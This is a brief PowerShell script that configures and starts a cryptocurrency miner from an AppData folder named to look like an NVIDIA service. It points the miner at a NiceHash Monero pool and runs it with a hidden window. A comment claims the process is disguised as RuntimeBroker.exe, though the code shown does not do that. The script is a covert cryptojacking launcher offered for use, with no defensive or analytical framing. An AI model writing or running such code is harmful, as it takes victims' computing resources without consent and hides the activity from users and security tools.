$APP  = "$env:APPDATA\NvBackend"
$EXE  = Get-ChildItem $APP -Filter *.exe | Select-Object -First 1 -ExpandProperty FullName
$CONF = "$APP\config.json"

$config = @{
    pools   = @(@{url="stratum+tcp://randomxmonero.usa.nicehash.com:3380";
                   user="YOUR_BTC_ADDRESS"; pass="x"})
    cpu     = @{enabled=$true; max-threads-hint=50}
    background = $true; donate-level = 0
}
$config | ConvertTo-Json -Depth 4 | Set-Content $CONF

# launch hidden & parent-spoof (RuntimeBroker.exe)
Start-Process -FilePath $EXE -ArgumentList "--config=$CONF" -WindowStyle Hidden
